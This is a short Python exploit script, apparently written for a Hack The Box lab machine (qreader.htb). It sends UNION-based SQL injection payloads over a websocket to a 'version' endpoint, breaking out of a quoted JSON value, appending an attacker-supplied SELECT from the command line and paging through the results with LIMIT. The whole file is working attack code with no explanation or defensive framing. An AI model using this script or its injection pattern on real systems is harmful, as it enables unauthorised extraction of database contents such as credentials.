import asyncio
import websockets
import sys

async def do_the_thing(a):
    async with websockets.connect("ws://qreader.htb:5789/version") as websocket:
        #print(a)
        print(await websocket.send(a))
        print(await websocket.recv())

for i in range(10):
    instring='{"version":"0.0.2\\" UNION '+ sys.argv[1] + ' LIMIT ' + str(i) + ',' + str(i+1) + ';-- -"}'
    #print(instring)
    asyncio.run(do_the_thing(instring))
